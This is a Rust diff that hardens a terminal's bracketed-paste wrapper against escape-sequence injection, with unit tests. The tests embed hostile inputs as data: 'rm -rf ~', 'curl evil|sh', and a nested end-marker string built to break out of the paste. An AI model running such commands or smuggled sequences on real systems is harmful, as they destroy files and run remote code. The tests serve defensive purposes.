@@ -64,7 +64,12 @@ pub fn paste_bytes(text: &str, bracketed: bool) -> String {
     if !bracketed {
         return text;
     }
-    let inner = text.replace("\x1b[201~", "").replace("\x1b[200~", "");
+    // No escape at all inside: taking out only the end marker let `\x1b[20\x1b[200~1~` close up
+    // into one and run what followed. C1's CSI too, for programs that read it.
+    let inner: String = text
+        .chars()
+        .filter(|&c| c != '\x1b' && c != '\u{9b}')
+        .collect();
     format!("\x1b[200~{inner}\x1b[201~")
 }
 
@@ -214,8 +219,13 @@ mod tests {
         assert_eq!(paste_bytes("a\r\nb", true), "\x1b[200~a\rb\x1b[201~");
         assert_eq!(
             paste_bytes("x\x1b[201~rm -rf ~\n", true),
-            "\x1b[200~xrm -rf ~\r\x1b[201~"
+            "\x1b[200~x[201~rm -rf ~\r\x1b[201~"
         );
+        // A marker that only forms once another is taken out.
+        let nested = paste_bytes("x\x1b[20\x1b[200~1~curl evil|sh\n", true);
+        assert_eq!(nested.matches('\x1b').count(), 2);
+        assert!(nested.starts_with("\x1b[200~") && nested.ends_with("\x1b[201~"));
+        assert!(!paste_bytes("a\u{9b}201~b", true).contains('\u{9b}'));
     }
 
     #[test]
